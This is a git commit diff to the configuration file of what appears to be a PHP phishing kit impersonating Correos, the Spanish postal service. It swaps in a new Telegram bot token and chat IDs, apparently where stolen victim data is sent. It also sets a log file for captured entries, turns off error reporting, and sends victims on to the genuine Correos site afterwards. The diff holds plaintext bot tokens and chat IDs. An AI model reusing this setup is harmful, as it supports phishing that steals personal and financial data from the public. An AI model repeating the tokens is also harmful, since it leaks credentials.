7864b6f2805882569aef8c02263a9a2783b0f47c
YOUSEfrigalo <121041646+TYjhkj@users.noreply.github.com>
2022-12-19 15:56:10 +0100

    y

--- settings/conf.php
+++ settings/conf.php
@@ -2,9 +2,9 @@
 
 error_reporting(0);
 
-define("TELEGRAM_TOKEN", "5544847494:AAEnhyodvVER8Tj09GJdirYv8pqdLEoNpwQ");
-define("TELEGRAM_CHAT_ID", "-819179036");
-define("TELEGRAM_CHAT_IDD", "-819179036");
+define("TELEGRAM_TOKEN", "5794569310:AAHKTIK_YvamgIBGE0dUMf3QtR-N7acpu1o");
+define("TELEGRAM_CHAT_ID", "869785984");
+define("TELEGRAM_CHAT_IDD", "-869785984");
 define("TXT_FILE_NAME", 'mjinina.txt');
 define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
 
